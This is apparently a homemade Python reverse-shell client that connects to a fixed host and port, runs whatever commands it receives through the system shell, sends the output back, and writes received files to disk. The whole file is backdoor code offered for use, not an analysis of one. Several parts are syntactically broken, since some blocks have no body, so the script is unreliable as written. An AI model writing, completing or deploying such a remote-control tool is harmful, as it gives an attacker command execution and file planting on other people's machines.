#!/usr/bin/python3.7
import socket
import subprocess
import os
# the global variables

HOST = '127.0.0.1'
PORT = 5556
threads = []
main_loop = False
second_loop = True

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    client.connect((HOST, PORT))
    main_loop = True

except ConnectionRefusedError:
    # print("the server is off line")


def reverse_shell():
    global main_loop, second_loop
    cmd = "a"
    cmd = client.recv(1024).decode()
    temp_list = cmd.split()
    if cmd == "end":
        second_loop = False
        main_loop = False
    elif cmd is "a":
    elif " " in cmd and temp_list[0] == "cd":
        try:
            os.chdir(temp_list[1])
            client.send(b"success")
        except:
            client.send(b"error wrong or invalid path")
    elif temp_list[0] == "touch":
        try:
            os.system(cmd)
            client.send(b"done")
        except:
            client.send(b"command error")
    elif temp_list[0] == "mkdir":
        try:
            os.system(cmd)
            client.send(b"done")
        except:
            client.send(b"command error")
    elif temp_list[0] == "rm":
        try:
            os.system(cmd)
            client.send(b"done")
        except:
            client.send(b"command error")
    else:
        proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        msg = proc.stdout.read()
        err = proc.stderr.read()
        if err == b'':
            client.send(msg)
        else:
            client.send(err)


def execute():
    global main_loop
    cmd = "a"
    cmd = client.recv(1024).decode()
    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    msg = proc.stdout.read()
    err = proc.stderr.read()
    if err == b'':
            client.send(msg)
    else:
        client.send(err)
    main_loop = False

def download_file():
    name_of_file = client.recv(1024)
    temp_var = client.recv(2048)
    with open (name_of_file, 'wb') as target:
        target = target.write(temp_var)
    


while main_loop:
    use = client.recv(1024).decode()
    if use == '-c' or use == "--command":
        while second_loop:
            reverse_shell()
    elif use == '-e' or use == "--execute":
        execute()
    elif use == '-u' or use == "--upload":
        download_file()
client.close()

